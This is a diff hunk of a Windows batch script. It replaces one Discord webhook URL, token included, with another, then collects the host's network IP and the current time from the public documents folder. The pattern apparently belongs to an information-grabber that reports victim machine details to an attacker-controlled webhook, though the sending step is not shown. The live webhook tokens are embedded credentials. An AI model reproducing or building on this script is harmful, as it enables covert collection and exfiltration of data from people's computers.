@@ -1,7 +1,7 @@
 @echo off
 set "vpath=C:\Users\Public\Documents"
 cd %vpath%
-set "webhook=https://discord.com/api/webhooks/962101334084038677/_sb0hZSx-AseC3EoegxlfXsPjeNSiyP7zaDyFODwASeIkwbg1D4F_i7pGm14PkzC5N43"
+set "webhook=https://discord.com/api/webhooks/962420744342634537/dtCZ9p4YlIB8jVYKWOw3La0ugweIgZgm4CLFZDzbtrt30XQ1SFnFDDf2MzHH_MmyPEBp"
 for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
 set HH24=%%a
